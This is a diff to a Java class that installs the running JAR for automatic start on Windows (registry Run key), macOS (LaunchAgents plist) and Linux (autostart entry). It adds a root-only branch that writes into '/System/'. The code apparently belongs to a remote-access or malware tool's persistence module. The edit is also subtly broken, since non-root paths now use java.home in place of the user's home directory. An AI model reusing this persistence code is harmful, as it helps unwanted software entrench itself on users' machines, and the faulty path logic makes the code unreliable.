@@ -13,6 +13,12 @@ public class Startup {
 	public static final void addToStartup(String name) throws Exception {
 		File currentJar = Utils.getJarFile();
 		
+		String home = System.getProperty("java.home");
+		
+		if (Utils.isRoot()) {
+			home = "/System/";
+		}
+		
 		if (currentJar.isFile()) {
 			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 				String javaHome = System.getProperty("java.home") + "\\bin\\javaw.exe";
@@ -23,7 +29,7 @@ public class Startup {
 				}
 				WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name, "\"" + javaHome + "\" -jar \"" + currentJar.getAbsolutePath() + "\"");
 			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
-				File startupFile = new File(System.getProperty("user.home") + "/Library/LaunchAgents/" + Main.name + ".plist");
+				File startupFile = new File(home + "/Library/LaunchAgents/" + Main.name + ".plist");
 				PrintWriter out = new PrintWriter(new FileWriter(startupFile));
 				out.println("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
 				out.println("<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">");
@@ -43,7 +49,7 @@ public class Startup {
 				out.println("</plist>");
 				out.close();
 			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.LINUX) {
-				File autostart = new File(System.getProperty("user.home") + "/.config/autostart/");
+				File autostart = new File(home + "/.config/autostart/");
 				
 				if (!autostart.exists()) {
 					autostart.mkdirs();
